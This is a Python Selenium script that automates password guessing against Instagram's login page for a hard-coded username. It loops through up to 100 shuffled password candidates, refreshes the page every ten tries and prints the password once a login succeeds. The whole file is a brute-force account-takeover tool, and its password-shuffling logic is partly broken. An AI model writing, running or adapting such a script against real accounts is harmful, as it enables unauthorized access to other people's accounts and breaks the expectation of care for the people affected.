import random
import datetime
import string
from selenium import webdriver
from selenium.webdriver.common.keys import Keys
from selenium.webdriver.common.by import By
from selenium.webdriver.support.ui import WebDriverWait
from selenium.webdriver.support import expected_conditions as EC

# create an instance of ChromeOptions class
options = webdriver.ChromeOptions()
options.add_argument("--incognito")
options.add_argument("--disable-cache")
options.add_argument("--disable-extensions")


# initialize the driver with the ChromeOptions instance
driver = webdriver.Chrome(options=options)

# go to the login page
driver.get("https://www.instagram.com/accounts/login/")

# wait for the username and password fields to load
username_input = WebDriverWait(driver, 10).until(EC.presence_of_element_located((By.NAME, "username")))
password_input = WebDriverWait(driver, 10).until(EC.presence_of_element_located((By.NAME, "password")))

your_username = "dt1dt2d"
your_password = ("Love@#", "Emiway")

username_input.send_keys(your_username)

# try different passwords
passwords_tried = set()

for i in range(100):
    # generate a new password if the previous one has already been tried
    while True:
        password = list(your_password)
        random.shuffle(password)
        your_password = ''.join(password)
        if your_password not in passwords_tried:
            break
    passwords_tried.add(your_password)

    # refresh the page every 10 attempts
    if i > 0 and i % 10 == 0:
        print("Refreshing page...")
        driver.refresh()
        username_input = WebDriverWait(driver, 10).until(EC.presence_of_element_located((By.NAME, "username")))
        password_input = WebDriverWait(driver, 10).until(EC.presence_of_element_located((By.NAME, "password")))
        username_input.send_keys(your_username)
    # enter the password and submit the form
    for i in range(len(your_password+your_password)):
        password_input.send_keys(Keys.BACKSPACE)
    password_input.send_keys(your_password)
    password_input.send_keys(Keys.RETURN)

    # wait for the popups to appear and dismiss them
    try:
        not_now_btn = WebDriverWait(driver, 1).until(EC.element_to_be_clickable((By.XPATH, "//button[contains(text(), 'Not Now')]")))
        not_now_btn.click()
    except:
        pass

    try:
        not_now_btn = WebDriverWait(driver, 1).until(EC.element_to_be_clickable((By.XPATH, "//button[contains(text(), 'Not Now')]")))
        not_now_btn.click()
    except:
        pass

    # check if login is successful
    if driver.current_url != "https://www.instagram.com/accounts/login/":
        print(f"Login successful! Password: {your_password}")
        break
    else:
        # print failure message
        print(f"Login unsuccessful. Attempted password: {your_password}")
